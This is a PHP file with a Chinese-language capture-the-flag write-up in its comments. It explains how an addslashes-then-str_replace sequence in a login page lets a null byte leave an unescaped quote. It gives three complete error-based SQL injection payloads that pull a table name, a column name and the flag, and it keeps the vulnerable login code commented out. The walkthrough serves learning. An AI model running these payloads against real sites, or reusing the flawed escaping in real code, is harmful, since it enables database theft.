<?php

/*

审查元素，发现提示index.php.txt。

打开后发现是php的中间代码opcode，查看了一下opcode的指令，大概猜了一下payload应该是:

?flag1=fvhjjihfcv&flag2=gfuyiyhioyf&flag3=yugoiiyhi

然后得到下一步的提示:

the next step is 1chunqiu.zip

下载提示文件，解压。得到源代码。发现注入点应该在login.php页面。字段是username。

看了一下有mysql_error()函数，应该是报错注入，但是代码对输入进行了过滤。首先要构造出单引号。

代码中添加转义之后还用number替换了一下，这里应该就可以绕过了。


绕过的逻辑大概如下:

​
这里需要注意的是提交数据的时候不能是\0而是%00。

最后按照常规的报错注入，这里麻烦一点的是由于单引号进行了转义，并且0也被替换了。所以使用转为ascii码方式绕过单引号转义也是不行的。我这里就多构造了几个子查询，不知道有不有更好的方法。

获取表的payload：

username=%00'or(1=1) and (select 1 from (select count(*),concat((select table_name FROM information_schema.tables where table_schema in (select  database()) limit 1),floor(rand(0)*2))x from information_schema.schemata group by x)a)%23&number=0&password=1

获取字段的payload：

username=%00'or(1=1) and (select 1 from (select count(*),concat(( select column_name from information_schema.columns where table_name in (select table_name FROM information_schema.tables where table_schema in (select  database())) limit 1),floor(rand(0)*2))x from information_schema.schemata group by x)a)%23&number=0&password=1

最后获取flag:

username=%00'or(1=1) and (select 1 from (select count(*),concat((select flag from flag limit 1),floor(rand(0)*2))x from information_schema.schemata group by x)a)%23&number=0&password=1


*/
// require_once 'dbmysql.class.php';
// require_once 'config.inc.php';
// //username=%00'or(1=1) and (select 1 from (select count(*),concat((select table_name FROM information_schema.tables where table_schema in (select  database()) limit 1),floor(rand(0)*2))x from information_schema.schemata group by x)a)%23&number=0&password=1
// //username=%00'or(1=1) and (select 1 from (select count(*),concat(( select column_name from information_schema.columns where table_name in (select table_name FROM information_schema.tables where table_schema in (select  database())) limit 1),floor(rand(0)*2))x from information_schema.schemata group by x)a)%23&number=0&password=1
// if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['number'])){
//     $db = new mysql_db();

//     $username = $db->safe_data($_POST['username']);// 先转义
//     $password = $db->my_md5($_POST['password']);
//     $number = is_numeric($_POST['number']) ? $_POST['number'] : 1;
//     $username = trim(str_replace($number, '', $username));  //再替换 这里可以产生绕过

//     $sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";
//     echo $sql."</br>";
//     $row = $db->query($sql);
//     $result = $db->fetch_array($row);
//     if($row){
//         if($result["number"] === $number && $result["password"] === $password){
//             echo "<script>alert('nothing here!')</script>";
//         }else{
//             echo "<script>
//             alert('密码错误，老司机翻车了!');
//             function jumpurl(){
//                 location='login.html';
//             }
//             setTimeout('jumpurl()',1000);
//             </script>";
//         }
//     }else{
//         exit(mysql_error());
//     }
// }else{
//     echo "<script>
//             alert('用户名密码不能为空!');
//             function jumpurl(){
//                 location='login.html';
//             }
//             setTimeout('jumpurl()',1000);
//         </script>";
// }
 $a = "?name=\0'";
 $b = addslashes($a);
 $c = str_replace(0,'',$b);
 echo $a,"</br>",$b,"</br>",$c;
// echo:
// ?name='
// ?name=\0\'
// ?name=\\' 

 ?>